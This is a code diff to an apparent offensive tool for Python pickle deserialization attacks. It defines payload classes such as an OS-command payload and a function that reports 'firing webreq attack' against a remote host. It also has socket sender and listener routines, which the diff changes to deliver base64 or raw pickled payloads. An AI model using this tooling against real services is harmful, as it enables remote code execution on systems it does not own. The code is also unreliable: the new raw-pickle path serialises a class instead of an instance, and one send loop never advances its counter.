@@ -11,6 +11,10 @@ class utility:
 		p=getattr(payloads,payload)
 		p=base64.b64encode(pickle.dumps(p()))
 		return p
+	def plainpickle(payload):
+		p=getattr(payloads,payload)
+		p=pickle.dumps(p)
+		return p
 
 class payloads:
 	class oscmd:
@@ -37,19 +41,27 @@ def webreq(schema,method,rhost,rport,payload,param=None,cook=None):
 		r(f"{schema}://{rhost}:{rport}",cookies=cookie)
 	return f"firing webreq attack against {schema}://{rhost} "
 
-def socksend(rhost,rport,payload, steps=0):
+def socksend(rhost,rport,payload, enc, steps=0):
 	rport=int(rport)
 	steps=int(steps)
+	if enc:
+		payload=utility.b64pickle(payload)
+	else:
+		payload=utility.plainpickle(payload)
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.connect((rhost,rport))
 		i=0
 		while i < steps:
 			s.sendall("arb".encode("utf-8"))
-		s.sendall(utility.b64pickle(payload))
+		s.sendall(payload)
 		s.recv(1024)
-def socklisten(lport,payload, steps=0):
+def socklisten(lport,payload, enc, steps=0):
 	lport=int(lport)
 	steps=int(steps)
+	if enc:
+		payload=utility.b64pickle(payload)
+	else:
+		payload=utility.plainpickle(payload)
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.bind(("",lport))
 		s.listen(1)
@@ -59,6 +71,6 @@ def socklisten(lport,payload, steps=0):
 			while i < steps:
 				conn.sendall("arb".encode("utf-8"))
 				i+=1
-			conn.sendall(utility.b64pickle(payload))
+			conn.sendall(payload)
 			conn.recv(1024)
 
